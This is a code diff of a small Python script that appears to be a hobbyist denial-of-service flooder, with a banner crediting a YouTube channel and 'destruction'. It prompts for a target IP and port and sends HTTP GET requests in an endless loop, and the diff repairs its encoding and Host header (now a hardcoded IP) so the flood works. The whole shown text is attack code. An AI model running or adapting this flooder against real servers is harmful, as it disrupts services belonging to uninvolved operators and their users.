@@ -14,6 +14,7 @@ print("""
   youtube channel: ch33ch
 Powered by: koda/ch33ch/destruction/zero x ...\n\n""")
 
+
 tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 ip = input("IP >>> ").strip()
@@ -33,8 +34,8 @@ except Exception as error:
 while True:
     try:
     
-        tcp_socket.sendto("GET /" + ip + "HTTP/1.1\r\n".encode('ascii'), (ip, port))
-        tcp_socket.sendto("Hots: " + "182.30.33" + "\r\n\r\n".encode("ascii"), (ip, port))
+        tcp_socket.sendto(("GET /" + ip + " HTTP/1.1\n").encode(), (ip, port))
+        tcp_socket.sendto(("Host: 176.28.50.165 \r\n\r\n").encode(), (ip, port))
         print(f"C4OS\033[31m({ip}//{port})\033[0m :<>> PACOTE ENVIADO")
     
     except:
